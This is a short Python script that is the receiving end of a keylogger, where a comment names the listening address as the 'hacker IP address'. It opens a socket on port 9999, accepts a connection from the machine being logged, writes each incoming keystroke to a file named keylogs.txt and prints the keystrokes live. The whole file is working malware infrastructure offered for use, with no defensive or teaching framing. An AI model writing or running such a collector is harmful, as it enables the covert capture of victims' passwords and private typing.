import socket

host = '' #hacker IP address in string, actually don't need it
port = 9999

s = socket.socket()
s.bind((host, port))
s.listen(2)

def file_write(keys):
    with open("keylogs.txt","a") as file:
        for key in keys:
            file.write(key)

print(host)
conn, address = s.accept()
print("Connected to Client: " + str(address))
while True:
    data = conn.recv(1024).decode()
    file_write(str(data))
    if not data:
        break
    if str(data) == 'Key.space':
        data = ' '
    if str(data) == 'Key.enter':
        data = '\n'
    print(str(data).strip("'"), end='', flush=True)
conn.close()
